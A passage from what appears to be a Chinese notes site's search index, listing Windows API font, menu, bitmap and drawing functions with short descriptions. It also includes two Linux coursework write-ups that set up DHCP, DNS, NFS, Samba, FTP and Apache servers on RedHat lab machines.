列举指定设备可用的字体dows系统 EnumFontFamiliesEx 列举指定设备可用的字体dows系统 EnumFonts 列举指定设备可用的字体dows系统 ExtTextOut 经过扩展的文本描绘函数。也请参考SetTextAlign函数dows系统 GetAspectRatioFilterEx 用SetMapperFlags要求Windows只选择与设备当前纵横比相符的光栅字体时，本函数可判断纵横比大小dows系统 GetCharABCWidths 判断TureType字体中一个或多个字符的A-B-C大小dows系统 GetCharABCWidthsFloat 查询一种字体中一个或多个字符的A-B-C尺寸dows系统 GetCharacterPlacement 该函数用于了解如何用一个给定的字符显示一个字串dows系统 GetCharWidth 调查字体中一个或多个字符的宽度dows系统 GetFontData 接收一种可缩放字体文件的数据dows系统 GetFontLanguageInfo 返回目前选入指定设备场景中的字体的信息dows系统 GetGlyphOutline 取得TureType字体中构成一个字符的曲线信息dows系统 GetKerningPairs 取得指定字体的字距信息dows系统 GetOutlineTextMetrics 接收与TureType字体内部特征有关的详细信息dows系统 GetRasterizerCaps 了解系统是否有能力支持可缩放的字体dows系统 GetTabbedTextExtent 判断一个字串占据的范围，同时考虑制表站扩充的因素dows系统 GetTextAlign 接收一个设备场景当前的文本对齐标志dows系统 GetTextCharacterExtra 判断额外字符间距的当前值dows系统 GetTextCharset 接收当前选入指定设备场景的字体的字符集标识符dows系统 GetTextCharsetInfo 获取与当前选定字体的字符集有关的详细信息dows系统 GetTextColor 判断当前字体颜色。通常也称为\"前景色\"dows系统 GetTextExtentExPoint 判断要填入指定区域的字符数量。也用一个数组装载每个字符的范围信息dows系统 GetTextExtentPoint 判断一个字串的大小（范围）dows系统 GetTextFace 获取一种字体的字样名dows系统 GetTextMetrics 获取与选入一种设备场景的物理字体有关的信息dows系统 GrayString 描绘一个以灰色显示的字串。通常由Windows用于标识禁止状态dows系统 PolyTextOut 描绘一系列字串dows系统 RemoveFontResource 从Windows系统中删除一种字体资源dows系统 SetMapperFlags Windows对字体进行映射时，可用该函数选择与目标设备的纵横比相符的光栅字体dows系统 SetTextAlign 设置文本对齐方式，并指定在文本输出过程中使用设备场景的当前位置dows系统 SetTextCharacterExtra 描绘文本的时候，指定要在字符间插入的额外间距dows系统 SetTextColor 设置当前文本颜色。这种颜色也称为\"前景色\"dows系统 SetTextJustification 通过指定一个文本行应占据的额外空间，可用这个函数对文本进行两端对齐处理dows系统 TabbedTextOut 支持制表站的一个文本描绘函数dows系统 TextOut 文本绘图函数dows系统 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/7、菜单函数.html":{"url":"4.编程语言/Windows_API/7、菜单函数.html","title":"7、菜单函数","keywords":"","body":" 函数名 功能描述 AppendMenu 在指定的菜单里添加一个菜单项 CheckMenuItem 复选或撤消复选指定的菜单条目 CheckMenuRadioItem 指定一个菜单条目被复选成\"单选\"项目 CreateMenu 创建新菜单 CreatePopupMenu 创建一个空的弹出式菜单 DeleteMenu 删除指定的菜单条目 DestroyMenu 删除指定的菜单 DrawMenuBar 为指定的窗口重画菜单 EnableMenuItem 允许或禁止指定的菜单条目 GetMenu 取得窗口中一个菜单的句柄 GetMenuCheckMarkDimensions 返回一个菜单复选符的大小 GetMenuContextHelpId 取得一个菜单的帮助场景ID GetMenuDefaultItem 判断菜单中的哪个条目是默认条目 GetMenuItemCount 返回菜单中条目（菜单项）的数量 GetMenuItemID 返回位于菜单中指定位置处的条目的菜单ID GetMenuItemInfo 取得（接收）与一个菜单条目有关的特定信息 GetMenuItemRect 在一个矩形中装载指定菜单条目的屏幕坐标信息 GetMenuState 取得与指定菜单条目状态有关的信息 GetMenuString 取得指定菜单条目的字串 GetSubMenu 取得一个弹出式菜单的句柄，它位于菜单中指定的位置 GetSystemMenu 取得指定窗口的系统菜单的句柄 HiliteMenuItem 控制顶级菜单条目的加亮显示状态 InsertMenu 在菜单的指定位置处插入一个菜单条目，并根据需要将其他条目向下移动 InsertMenuItem 插入一个新菜单条目 IsMenu 判断指定的句柄是否为一个菜单的句柄 LoadMenu 从指定的模块或应用程序实例中载入一个菜单 LoadMenuIndirect 载入一个菜单 MenuItemFromPoint 判断哪个菜单条目包含了屏幕上一个指定的点 ModifyMenu 改变菜单条目 RemoveMenu 删除指定的菜单条目 SetMenu 设置窗口菜单 SetMenuContextHelpId 设置一个菜单的帮助场景ID SetMenuDefaultItem 将一个菜单条目设为默认条目 SetMenuItemBitmaps 设置一幅特定位图，令其在指定的菜单条目中使用，代替标准的复选符号（√） SetMenuItemInfo 为一个菜单条目设置指定的信息 TrackPopupMenu 在屏幕的任意地方显示一个弹出式菜单 TrackPopupMenuEx 与TrackPopupMenu相似，只是它提供了额外的功能 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/8、位图、图标和光栅运算函数.html":{"url":"4.编程语言/Windows_API/8、位图、图标和光栅运算函数.html","title":"8、位图、图标和光栅运算函数","keywords":"","body":" 函数名 功能描述 BitBlt 将一幅位图从一个设备场景复制到另一个 CopyIcon 制作指定图标或鼠标指针的一个副本。这个副本从属于发出调用的应用程序 CopyImage 复制位图、图标或指针，同时在复制过程中进行一些转换工作 CreateBitmap 按照规定的格式创建一幅与设备有关位图 CreateBitmapIndirect 创建一幅与设备有关位图 CreateCompatibleBitmap 创建一幅与设备有关位图，它与指定的设备场景兼容 CreateCursor 创建一个鼠标指针 CreateDIBitmap 根据一幅与设备无关的位图创建一幅与设备有关的位图 CreateDIBSection 创建一个DIBSection CreateIcon 创建一个图标 CreateIconIndirect 创建一个图标 DestroyCursor 清除指定的鼠标指针，并释放它占用的所有系统资源 DestroyIcon 清除图标 DrawIcon 在指定的位置画一个图标 DrawIconEx 描绘一个图标或鼠标指针。与DrawIcon相比，这个函数提供了更多的功能 ExtractAssociatedIcon 判断一个可执行程序或DLL中是否存在图标，或是否有图标与系统注册表中指定的文件存在关联并提取之 ExtractIcon 判断一个可执行文件或DLL中是否有图标存在，并将其提取出来 GetBitmapBits 将来自位图的二进制位复制到一个缓冲区 GetBitmapDimensionEx 取得一幅位图的宽度和高度 GetDIBColorTable 从选入设备场景的DIBSection中取得颜色表信息 GetDIBits 将来自一幅位图的二进制位复制到一幅与设备无关的位图里 GetIconInfo 取得与图标有关的信息 GetStretchBltMode 判断StretchBlt LoadBitmap 从指定的模块或应用程序实例中载入一幅位图 LoadCursor 从指定的模块或应用程序实例中载入一个鼠标指针 LoadCursorFromFile 在一个指针文件或一个动画指针文件的基础上创建一个指针 LoadIcon 从指定的模块或应用程序实例中载入一个图标 LoadImage 载入一个位图、图标或指针 MaskBlt 执行复杂的图象传输，同时进行掩模（MASK）处理 PatBlt 在当前选定的刷子的基础上，用一个图案填充指定的设备场景 PlgBlt 复制一幅位图，同时将其转换成一个平行四边形。利用它可对位图进行旋转处理 SetBitmapBits 将来自缓冲区的二进制位复制到一幅位图 SetBitmapDimensionEx 设置一幅位图的宽度。以一毫米的十分之一为单位 SetDIBColorTable 设置选入设备场景的一个DIBSection的颜色表信息 SetDIBits 将来自与设备无关位图的二进制位复制到一幅与设备有关的位图里 SetDIBitsToDevice 将一幅与设备无关位图的全部或部分数据直接复制到一个设备 SetStretchBltMode 指定StretchBlt StretchBlt 将一幅位图从一个设备场景复制到另一个 StretchDIBits 将一幅与设备无关位图的全部或部分数据直接复制到指定的设备场景 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"4.编程语言/Windows_API/9、绘图函数.html":{"url":"4.编程语言/Windows_API/9、绘图函数.html","title":"9、绘图函数","keywords":"","body":" 函数名 功能描述 AbortPath 抛弃选入指定设备场景中的所有路径。也取消目前正在进行的任何路径的创建工作 AngleArc 用一个连接弧画一条线 Arc 画一个圆弧 BeginPath 启动一个路径分支 CancelDC 取消另一个线程里的长时间绘图操作 Chord 画一个弦 CloseEnhMetaFile 关闭指定的增强型图元文件设备场景，并将新建的图元文件返回一个句柄 CloseFigure 描绘到一个路径时，关闭当前打开的图形 CloseMetaFile 关闭指定的图元文件设备场景，并向新建的图元文件返回一个句柄 CopyEnhMetaFile 制作指定增强型图元文件的一个副本（拷贝） CopyMetaFile 制作指定（标准）图元文件的一个副本 CreateBrushIndirect 在一个LOGBRUSH数据结构的基础上创建一个刷子 CreateDIBPatternBrush 用一幅与设备无关的位图创建一个刷子，以便指定刷子样式（图案） CreateEnhMetaFile 创建一个增强型的图元文件设备场景 CreateHatchBrush 创建带有阴影图案的一个刷子 CreateMetaFile 创建一个图元文件设备场景 CreatePatternBrush 用指定了刷子图案的一幅位图创建一个刷子 CreatePen 用指定的样式、宽度和颜色创建一个画笔 CreatePenIndirect 根据指定的LOGPEN结构创建一个画笔 CreateSolidBrush 用纯色创建一个刷子 DeleteEnhMetaFile 删除指定的增强型图元文件 DeleteMetaFile 删除指定的图元文件 DeleteObject 删除GDI对象，对象使用的所有系统资源都会被释放 DrawEdge 用指定的样式描绘一个矩形的边框 DrawEscape 换码（Escape）函数将数据直接发至显示设备驱动程序 DrawFocusRect 画一个焦点矩形 DrawFrameControl 描绘一个标准控件 DrawState 为一幅图象或绘图操作应用各式各样的效果 Ellipse 描绘一个椭圆，由指定的矩形围绕 EndPath 停止定义一个路径 EnumEnhMetaFile 针对一个增强型图元文件，列举其中单独的图元文件记录 EnumMetaFile 为一个标准的windows图元文件枚举单独的图元文件记录 EnumObjects 枚举可随同指定设备场景使用的画笔和刷子 ExtCreatePen 创建一个扩展画笔（装饰或几何） ExtFloodFill 在指定的设备场景里，用当前选择的刷子填充一个区域 FillPath 关闭路径中任何打开的图形，并用当前刷子填充 FillRect 用指定的刷子填充一个矩形 FlattenPath 将一个路径中的所有曲线都转换成线段 FloodFill 用当前选定的刷子在指定的设备场景中填充一个区域 FrameRect 用指定的刷子围绕一个矩形画一个边框 GdiComment 为指定的增强型图元文件设备场景添加一条注释信息 GdiFlush 执行任何未决的绘图操作 GdiGetBatchLimit 判断有多少个GDI绘图命令位于队列中 GdiSetBatchLimit 指定有多少个GDI绘图命令能够进入队列 GetArcDirection 画圆弧的时候，判断当前采用的绘图方向 GetBkColor 取得指定设备场景当前的背景颜色 GetBkMode 针对指定的设备场景，取得当前的背景填充模式 GetBrushOrgEx 判断指定设备场景中当前选定刷子起点 GetCurrentObject 获得指定类型的当前选定对象 GetCurrentPositionEx 在指定的设备场景中取得当前的画笔位置 GetEnhMetaFile 取得磁盘文件中包含的一个增强型图元文件的图元文件句柄 GetEnhMetaFileBits 将指定的增强型图元文件复制到一个内存缓冲区里 GetEnhMetaFileDescription 返回对一个增强型图元文件的说明 GetEnhMetaFileHeader 取得增强型图元文件的图元文件头 GetEnhMetaFilePaletteEntries 取得增强型图元文件的全部或部分调色板 GetMetaFile 取得包含在一个磁盘文件中的图元文件的图元文件句柄 GetMetaFileBitsEx 将指定的图元文件复制到一个内存缓冲区 GetMiterLimit 取得设备场景的斜率限制（Miter）设置 GetNearestColor 根据设备的显示能力，取得与指定颜色最接近的一种纯色 GetObjectAPI 取得对指定对象进行说明的一个结构 GetObjectType 判断由指定句柄引用的GDI对象的类型 GetPath 取得对当前路径进行定义的一系列数据 GetPixel 在指定的设备场景中取得一个像素的RGB值 GetPolyFillMode 针对指定的设备场景，获得多边形填充模式 GetROP2 针对指定的设备场景，取得当前的绘图模式 GetStockObject 取得一个固有对象（Stock） GetSysColorBrush 为任何一种标准系统颜色取得一个刷子 GetWinMetaFileBits 通过在一个缓冲区中填充用于标准图元文件的数据，将一个增强型图元文件转换成标准windows图元文件 InvertRect 通过反转每个像素的值，从而反转一个设备场景中指定的矩形 LineDDA 枚举指定线段中的所有点 LineTo 用当前画笔画一条线，从当前位置连到一个指定的点 MoveToEx 为指定的设备场景指定一个新的当前画笔位置 PaintDesk 在指定的设备场景中描绘桌面墙纸图案 PathToRegion 将当前选定的路径转换到一个区域里 Pie 画一个饼图 PlayEnhMetaFile 在指定的设备场景中画一个增强型图元文件 PlayEnhMetaFileRecord 回放单独一条增强型图元文件记录 PlayMetaFile 在指定的设备场景中回放一个图元文件 PlayMetaFileRecord 回放来自图元文件的单条记录 PolyBezier 描绘一条或多条贝塞尔（Bezier）曲线 PolyDraw 描绘一条复杂的曲线，由线段及贝塞尔曲线组成 Polygon 描绘一个多边形 Polyline 用当前画笔描绘一系列线段 PolyPolygon 用当前选定画笔描绘两个或多个多边形 PolyPolyline 用当前选定画笔描绘两个或多个多边形 Rectangle 用当前选定的画笔描绘矩形，并用当前选定的刷子填充 RoundRect 用当前选定的画笔画一个圆角矩形，并用当前选定的刷子在其中填充 SelectClipPath 将设备场景当前的路径合并到剪切区域里 SelectObject 为当前设备场景选择图形对象 SetArcDirection 设置圆弧的描绘方向 SetBkColor 为指定的设备场景设置背景颜色 SetBkMode 指定阴影刷子、虚线画笔以及字符中的空隙的填充方式 SetBrushOrgEx 为指定的设备场景设置当前选定刷子的起点 SetEnhMetaFileBits 用指定内存缓冲区内包含的数据创建一个增强型图元文件 SetMetaFileBitsEx 用包含在指定内存缓冲区内的数据结构创建一个图元文件 SetMiterLimit 设置设备场景当前的斜率限制 SetPixel 在指定的设备场景中设置一个像素的RGB值 SetPixelV 在指定的设备场景中设置一个像素的RGB值 SetPolyFillMode 设置多边形的填充模式 SetROP2 设置指定设备场景的绘图模式。与vb的DrawMode属性完全一致 SetWinMetaFileBits 将一个标准Windows图元文件转换成增强型图元文件 StrokeAndFillPath 针对指定的设备场景，关闭路径上打开的所有区域 StrokePath 用当前画笔描绘一个路径的轮廓。打开的图形不会被这个函数关闭 UnrealizeObject 将一个刷子对象选入设备场景之前，如刷子的起点准备用SetBrushOrgEx修改，则必须先调用本函数 WidenPath 根据选定画笔的宽度，重新定义当前选定的路径 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/学校课程/Linux期中大作业.html":{"url":"5.其他/学校课程/Linux期中大作业.html","title":"Linux期中大作业","keywords":"","body":" 1、RedHat-01配置（172.16.20.3） 1）DHCP Server（172.16.20.3） 安装dhcp服务 [aaa@c1 ~]$ sudo yum install dhcp-server -y 配置服务器静态IP [aaa@c1 ~]$ sudo vim /etc/sysconfig/network-scripts/ifcfg-ens160 BROWSER_ONLY=no BOOTPROTO=static DEFROUTE=yes IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=ens160 UUID=51c352cf-52eb-40df-9cdd-2bbb6d3caea2 DEVICE=ens160 ONBOOT=yes IPV6_PRIVACY=no PEERDNS=no IPADDR=172.16.20.3 NETMASK=255.255.255.0 GATEWAY=172.16.20.1 配置dhcp服务 [aaa@c1 ~]$ sudo cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf [aaa@c1 ~]$ sudo vim /etc/dhcp/dhcpd.conf # 删除多余配置，添加以下内容： option domain-name \"dns.ix88.com\"; option domain-name-servers 172.16.20.3; default-lease-time 600; max-lease-time 7200; log-facility local7; subnet 172.16.20.0 netmask 255.255.255.0 { range 172.16.20.3 172.16.20.120; option domain-name-servers 172.16.20.3; option domain-name \"dns.ix88.com\"; option routers 172.16.20.1; default-lease-time 600; max-lease-time 7200; } # 查看samba服务器的ens-160网卡，得到网卡地址进行地址绑定 host samba.ix88.com { hardware ethernet 00:0c:29:50:e8:3d; fixed-address 172.16.20.10; } 重启dhcp服务 [aaa@c1 ~]$ sudo systemctl restart dhcpd 2）主DNS Server（dns.ix88.com） 安装bind [aaa@c1 ~]$ sudo yum install bind* -y 修改sudo vim /etc/named.conf改两个any 修改sudo vim /etc/named.rfc1912.zones # 文件末尾添加以下语句： zone \"ix88.com\" IN { type master; file \"ix88.com.zone\"; allow-update { none; }; }; zone \"20.16.172.in-addr.arpa\" IN { type master; file \"0.20.16.172.arpa\"; allow-update { none; }; }; 编辑正反向解析区域 # 复制模版文件 [aaa@c1 ~]$ sudo cp -a /var/named/named.localhost /var/named/ix88.com.zone [aaa@c1 ~]$ sudo cp -a /var/named/named.loopback /var/named/0.20.16.172.arpa # 编辑ix88.com.zone [aaa@c1 ~]$ sudo vim /var/named/ix88.com.zone $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.ix88.com. A 127.0.0.1 AAAA ::1 dns A 172.16.20.3 nfs CNAME dns samba A 172.16.20.1 # 编辑0.20.16.172.arpa [aaa@c1 ~]$ sudo vim /var/named/0.20.16.172.arpa $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.ix88.com. A 127.0.0.1 AAAA ::1 3 PTR dns.ix88.com. 3 PTR nfs.ix88.com. 10 PTR samba.ix88.com. 重启named服务并放行dns服务 [aaa@c1 ~]$ sudo systemctl restart named [aaa@c1 ~]$ sudo firewall-cmd --permanent --add-service=dns [aaa@c1 ~]$ sudo firewall-cmd --reload 客户端验证 3）NFS Server（nfs.ix88.com） 安装NFS服务并放行防火墙 [aaa@c1 ~]$ sudo yum install rpcbind nfs-utils -y [aaa@c1 ~]$ sudo firewall-cmd --permanent --add-service=nfs [aaa@c1 ~]$ sudo firewall-cmd --reload 创建共享目录/share，并添加测试文件 [aaa@c1 ~]$ sudo mkdir /share # 切换为root权限 [root@c1 ~]$ echo \"This is test file\" > /share/ReadOnly [aaa@c1 ~]$ sudo chmod 777 -R /share 修改配置文件添加一下内容 [aaa@c1 ~]$ sudo vim /etc/exports /share 172.16.20.0/24(ro,all_squash,anonuid=1100,anongid=1100) # 重启NFS服务 [aaa@c1 ~]$ sudo systemctl restart nfs-server.service 客户端验证 [aaa@c2 ~]$ sudo mkdir /mnt/share [aaa@c2 ~]$ sudo mount -t nfs 172.16.20.3:/share /mnt/share # 验证只读权限 [aaa@c2 ~]$ echo \"Write Data\" >> /mnt/share/ReadOnly -bash: /mnt/share/ReadOnly: 只读文件系统 2、RedHat-02配置（172.16.20.10） 1）辅助DNS Server 安装bind并放行防火墙 [aaa@c2 ~]$ sudo yum install bind* -y [aaa@c2 ~]$ sudo firewall-cmd --permanent --add-service=nfs [aaa@c2 ~]$ sudo firewall-cmd --reload 修改sudo vim /etc/named.conf改两个any 修改sudo vim /etc/named.rfc1912.zones zone \"ix88.com\" IN { type slave; file \"slaves/slave.ix88.com.zone\"; masters { 172.16.20.3; }; }; zone \"20.16.172.in-addr.arpa\" IN { type slave; file \"slaves/slave.0.20.16.172.arpa\"; masters { 172.16.20.3; }; }; 客户端nslookup验证 2）Samba Server（samba.ix88.com） 安装samba并放行防火墙 [aaa@c2 ~]$ sudo yum install samba -y [aaa@c2 ~]$ sudo firewall-cmd --permanent --add-service=samba [aaa@c2 ~]$ sudo firewall-cmd --reload 创建共享目录 [aaa@c2 ~]$ sudo mkdir /boos [aaa@c2 ~]$ sudo mkdir /tech 创建用户和组设置密码并绑定共享目录 [aaa@c2 ~]$ sudo groupadd boos [aaa@c2 ~]$ sudo groupadd tech [aaa@c2 ~]$ sudo useradd boos -g boos -G tech [aaa@c2 ~]$ sudo useradd tech -g tech [aaa@c2 ~]$ sudo passwd boos [aaa@c2 ~]$ sudo passwd tech [aaa@c2 ~]$ sudo chown -R boos.boos /boos [aaa@c2 ~]$ sudo chown -R tech.tech /tech 设置samba用户 [aaa@c2 ~]$ sudo smbpasswd -a boos [aaa@c2 ~]$ sudo smbpasswd -a tech 设置文件ACL策略 [aaa@c2 ~]$ sudo setfacl -m g:boos:rw- /boos [aaa@c2 ~]$ sudo setfacl -m g:boos:rw- /tech [aaa@c2 ~]$ sudo setfacl -m g:tech:r-- /tech [aaa@c2 ~]$ sudo setfacl -m o::--- /boos [aaa@c2 ~]$ sudo setfacl -m o::--- /tech # 查看文件权限是否正确 [aaa@c2 ~]$ sudo getfacl /boos [aaa@c2 ~]$ sudo getfacl /tech 设置配置文件，添加以下内容 [aaa@c2 ~]$ sudo vim /etc/samba/smb.conf [boos] comment = boos path = /boos public = no writable = yes browsable = yes [tech] comment = tech path = /tech public = no writable = no browsable = yes 重启samba服务 [aaa@c2 ~]$ sudo systemctl restart smb [aaa@c2 ~]$ sudo systemctl restart nmb 客户端验证 # windows win + R \\\\samba.ix88.com # Linux [aaa@c1 ~]$ sudo yum install samba-client -y [aaa@c1 ~]$ sudo smbclient //172.16.20.10/boos -U boos # 可读可写 [aaa@c1 ~]$ sudo smbclient //172.16.20.10/boos -U tech # 不可读 [aaa@c1 ~]$ sudo smbclient //172.16.20.10/tech -U boos # 可读 [aaa@c1 ~]$ sudo smbclient //172.16.20.10/tech -U tech # 可读 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/学校课程/Linux期末大作业.html":{"url":"5.其他/学校课程/Linux期末大作业.html","title":"Linux期末大作业","keywords":"","body":" 1、RedHat-01配置（192.168.20.5） 0）安装相关服务并放行防火墙 [aaa@c1 ~]$ sudo yum install dhcp-server bind* samba -y [aaa@c1 ~]$ sudo firewall-cmd --permanent --add-service=samba --add-service=dns [aaa@c1 ~]$ sudo firewall-cmd --reload [aaa@c1 ~]$ sudo firewall-cmd --list-all 1）DHCP Server（192.168.20.5） 配置服务器静态IP [aaa@c1 ~]$ sudo vim /etc/sysconfig/network-scripts/ifcfg-enp0s3 BROWSER_ONLY=no BOOTPROTO=static DEFROUTE=yes IPV4_FAILURE_FATAL=no IPV6INIT=yes IPV6_AUTOCONF=yes IPV6_DEFROUTE=yes IPV6_FAILURE_FATAL=no IPV6_ADDR_GEN_MODE=stable-privacy NAME=enp0s3 UUID=51c352cf-52eb-40df-9cdd-2bbb6d3caea2 DEVICE=enp0s3 ONBOOT=yes IPV6_PRIVACY=no PEERDNS=no IPADDR=192.168.20.5 NETMASK=255.255.255.0 GATEWAY=192.168.20.1 配置dhcp服务 [aaa@c1 ~]$ sudo cp /usr/share/doc/dhcp*/dhcpd.conf.example /etc/dhcp/dhcpd.conf [aaa@c1 ~]$ sudo vim /etc/dhcp/dhcpd.conf # 删除多余配置，添加以下内容： option domain-name \"dns.Hello8.com\"; option domain-name-servers 192.168.20.5; default-lease-time 600; max-lease-time 7200; log-facility local7; subnet 192.168.20.0 netmask 255.255.255.0 { range 192.168.20.10 192.168.20.100; option domain-name-servers 192.168.20.5; option domain-name \"dns.Hello8.com\"; option routers 192.168.20.1; default-lease-time 600; max-lease-time 7200; } # 查看web服务器的enp0s3网卡，得到网卡地址进行地址绑定 host www.Hello8.com { hardware ethernet 08:00:27:a2:73:3b; fixed-address 192.168.20.10; } 重启dhcp服务 [aaa@c1 ~]$ sudo systemctl restart dhcpd 2）DNS Server（dns.Hello8.com） 修改sudo vim /etc/named.conf改两个any 修改sudo vim /etc/named.rfc1912.zones # 文件末尾添加以下语句： zone \"Hello8.com\" IN { type master; file \"Hello8.com.zone\"; allow-update { none; }; }; zone \"20.168.192.in-addr.arpa\" IN { type master; file \"0.20.168.192.arpa\"; allow-update { none; }; }; 编辑正反向解析区域 ```shell 复制模版文件 [aaa@c1 ~]$ sudo cp -a /var/named/named.localhost /var/named/Hello8.com.zone [aaa@c1 ~]$ sudo cp -a /var/named/named.loopback /var/named/0.20.168.192.arpa 编辑ix88.com.zone [aaa@c1 ~]$ sudo vim /var/named/Hello8.com.zone $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.Hello8.com. A 127.0.0.1 AAAA ::1 dns A 192.168.20.5 dhcp CNAME dns samba CNAME dns www A 192.168.20.10 nfs CNAME www ftp CNAME www 编辑0.20.16.172.arpa [aaa@c1 ~]$ sudo vim /var/named/0.20.168.192.arpa $TTL 1D @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.Hello8.com. A 127.0.0.1 AAAA ::1 5 PTR dns.Hello8.com. 5 PTR dhcp.Hello8.com. 5 PTR samba.Hello8.com. 10 PTR nfs.Hello8.com. 10 PTR ftp.Hello8.com. 10 PTR www.Hello8.com. ``` 客户端验证 3）Samba Server（samba.Hello8.com） 创建共享目录 [aaa@c2 ~]$ sudo mkdir /boos [aaa@c2 ~]$ sudo mkdir /sales 创建用户和组设置密码并绑定共享目录 [aaa@c2 ~]$ sudo groupadd boos [aaa@c2 ~]$ sudo groupadd sales [aaa@c2 ~]$ sudo useradd boos -g boos -G sales [aaa@c2 ~]$ sudo useradd sales -g sales [aaa@c2 ~]$ sudo passwd boos [aaa@c2 ~]$ sudo passwd sales [aaa@c2 ~]$ sudo chown -R boos.boos /boos [aaa@c2 ~]$ sudo chown -R sales.sales /sales 设置samba用户 [aaa@c2 ~]$ sudo smbpasswd -a boos [aaa@c2 ~]$ sudo smbpasswd -a sales 设置文件ACL策略 [aaa@c2 ~]$ sudo setfacl -m g:boos:rw- /boos [aaa@c2 ~]$ sudo setfacl -m g:boos:r-- /sales [aaa@c2 ~]$ sudo setfacl -m g:sales:r-- /sales [aaa@c2 ~]$ sudo setfacl -m o::--- /boos [aaa@c2 ~]$ sudo setfacl -m o::--- /sales # 查看文件权限是否正确 [aaa@c2 ~]$ sudo getfacl /boos [aaa@c2 ~]$ sudo getfacl /sales 设置配置文件，添加以下内容 [aaa@c2 ~]$ sudo vim /etc/samba/smb.conf [boos] comment = boos path = /boos public = no writable = yes browsable = yes [sales] comment = sales path = /sales public = no writable = no browsable = yes 重启samba服务 [aaa@c2 ~]$ sudo systemctl restart smb [aaa@c2 ~]$ sudo systemctl restart nmb 客户端验证 # windows win + R \\\\samba.Hello8.com # Linux [aaa@c1 ~]$ sudo yum install samba-client -y [aaa@c1 ~]$ sudo smbclient //192.168.20.5/boos -U boos # 可读可写 [aaa@c1 ~]$ sudo smbclient //192.168.20.5/boos -U sales # 不可访问 [aaa@c1 ~]$ sudo smbclient //192.168.20.5/sales -U boos # 可读 [aaa@c1 ~]$ sudo smbclient //192.168.20.5/sales -U sales # 可读 2、RedHat-02配置（192.168.20.10） 0）安装相关服务并放行防火墙 [aaa@c1 ~]$ sudo yum install rpcbind nfs-utils vsftpd httpd -y [aaa@c1 ~]$ sudo firewall-cmd --permanent --add-service=http --add-service=nfs --add-service=ftp [aaa@c1 ~]$ sudo firewall-cmd --reload [aaa@c1 ~]$ sudo firewall-cmd --list-all 1）NFS Server（nfs.Hello8.com） 创建共享目录/public，并添加测试文件 [aaa@c1 ~]$ sudo mkdir /public # 切换为root权限 [root@c1 ~]$ echo \"This is test file\" > /public/demo-file [aaa@c1 ~]$ sudo chmod 777 -R /public 修改配置文件添加一下内容 [aaa@c1 ~]$ sudo vim /etc/exports /public 192.168.20.0/24(rw,all_squash,anonuid=1105,anongid=1105) # 重启NFS服务 [aaa@c1 ~]$ sudo systemctl restart nfs-server.service 客户端验证 [aaa@c2 ~]$ sudo mkdir /mnt/public [aaa@c2 ~]$ sudo mount -t nfs 192.168.20.10:/public /mnt/public # 验证读权限 [aaa@c2 ~]$ echo \"Write Data\" >> /mnt/public/demo-file 2）FTP Server（ftp.Hello8.com） 备份vsftpd的配置文件 [aaa@c2 ~]$ sudo cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.con.bak 创建用户和组 [aaa@c2 ~]$ sudo useradd -s /sbin/nologin team1 [aaa@c2 ~]$ sudo passwd team1 ... [aaa@c2 ~]$ [aaa@c2 ~]$ [aaa@c2 ~]$ [aaa@c2 ~]$ 打开配置文件 [aaa@c2 ~]$ sudo vim /etc/vsftpd/vsftpd.conf # 修改以下内容 anonymous_enable=NO local_enable=YES local_root=/var/www chroot_list_enable=YES chroot_list_file=/etc/vsftpd/chroot_list allow_writeable_chroot=YES # 添加放行用户 [aaa@c2 ~]$ sudo vim /etc/vsftpd/chroot_list team1 # 修改本地权限 [aaa@c2 ~]$ sudo chmod -R o+w /var/www/ # 修改pam配置文件 [aaa@c2 ~]$ sudo vim /etc/pam.d/vsftpd 注释auth required pam_shells.so 重启vsftpd 服务 [aaa@c2 ~]$ sudo systemctl restart vsftpd 验证 3）Web Server（www.Hello8.com） 添加一个ip地址 [aaa@c2 ~]$ sudo vim /etc/sysconfig/network-scripts/ifcfg-enp0s3:0 DEVICE=enp0s3:0 TYPE=Ethernet BOOTPROTO=static IPADDR=192.168.20.11 NETMASK=255.255.255.0 GATEWAY=192.168.20.1 ONBOOT=yes [aaa@c2 ~]$ sudo ifup enp0s3 添加用户并生成密码文件 [aaa@c2 ~]$ sudo htpasswd -cs /etc/httpd/conf.d/.htpasswd huangwenlong 编辑用户验证配置和两个虚拟主机 [aaa@c2 ~]$ sudo vim /etc/httpd/conf.d/userdir.conf Options Indexes FollowSymLinks allowoverride authconfig AllowOverride None AuthType Basic AuthName \"huangwenlong\" AuthUserFile /etc/httpd/conf.d/.htpasswd Require user huangwenlong [aaa@c2 ~]$ sudo vim /etc/httpd/conf.d/VirHost.conf DocumentRoot \"/var/www/web1\" ErrorLog logs/10-error_log DocumentRoot \"/var/www/web2\" ErrorLog logs/11-error_log 为个人用户创建站点 [aaa@c2 ~]$ sudo useradd huangwenlong [aaa@c2 ~]$ sudo passwd huangwenlong [aaa@c2 ~]$ sudo vim /etc/httpd/conf.d/userdir.conf # # UserDir is disabled by default since it can confirm the presence # of a username on the system (depending on home directory # permissions). # #UserDir disabled # # To enable requests to /~user/ to serve the user's public_html # directory, remove the \"UserDir disabled\" line above, and uncomment # the following line instead: # UserDir public_html 